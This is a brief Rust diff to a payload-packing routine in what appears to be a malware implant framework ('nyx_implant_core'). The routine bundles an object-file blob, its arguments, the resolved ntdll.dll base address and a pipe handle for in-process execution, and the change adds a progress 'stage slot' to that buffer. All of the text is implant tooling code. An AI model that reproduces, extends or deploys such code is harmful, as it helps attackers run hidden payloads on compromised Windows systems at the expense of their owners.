@@ -199,11 +199,12 @@ fn pack_payload(blob: &[u8], args: &[String], pipe_write_val: usize) -> Vec<u8> 
     // lib.rs export_addr / shim.rs out_write).
     let nt = unsafe { nyx_implant_core::resolve::module_base_by_name(b"ntdll.dll") }
         .unwrap_or(core::ptr::null_mut()) as u64;
-    let mut out = Vec::with_capacity(8 + blob.len() + packed_args.len() + 16);
+    let mut out = Vec::with_capacity(8 + blob.len() + packed_args.len() + 24);
     out.extend_from_slice(&(blob.len() as u32).to_le_bytes());
     out.extend_from_slice(blob);
     out.extend_from_slice(&(packed_args.len() as u32).to_le_bytes());
     out.extend_from_slice(&packed_args);
+    out.extend_from_slice(&0u64.to_le_bytes()); // stage slot (bof-host progress; read by diagnostics)
     out.extend_from_slice(&nt.to_le_bytes());
     out.extend_from_slice(&(pipe_write_val as u64).to_le_bytes());
     out
